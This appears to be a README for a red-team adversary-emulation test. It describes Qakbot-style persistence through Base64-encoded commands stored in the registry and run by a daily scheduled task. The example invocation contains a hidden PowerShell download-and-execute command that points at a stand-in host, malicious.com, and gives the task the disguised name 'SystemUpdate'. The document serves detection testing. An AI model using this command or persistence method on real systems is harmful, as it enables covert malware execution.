# Scheduled Task Executing Base64 Encoded Commands From Registry

## Description
Stores Base64-encoded commands in Windows registry and executes them through scheduled tasks. Used by Qakbot banking trojan. Combines Base64 obfuscation, registry storage, and scheduled tasks for automated execution. Maintains access and executes payloads on schedule.

Adapted from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)

## Arguments
- **time**: Daily scheduled task execution time (default: `07:45`)
- **task_name**: Name of scheduled task (default: `ATOMIC-T1053.005`)
- **command_to_execute**: Command to execute (default: `ping 127.0.0.1`)

## Example(s)
You can run this TTP with the following command:
```bash
ttpforge run forgearmory//persistence/create-scheduled-task-execute-reg-b64/ttp.yaml \
  --time "09:30" \
  --task_name "SystemUpdate" \
  --command_to_execute "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')"
```

## Steps
1. **create_registry_based_scheduled_task**: Converts the specified command to Base64 encoding, stores it in a new registry key under HKCU\SOFTWARE with the task name, then creates a scheduled task that runs daily at the specified time to decode and execute the command from the registry using PowerShell.
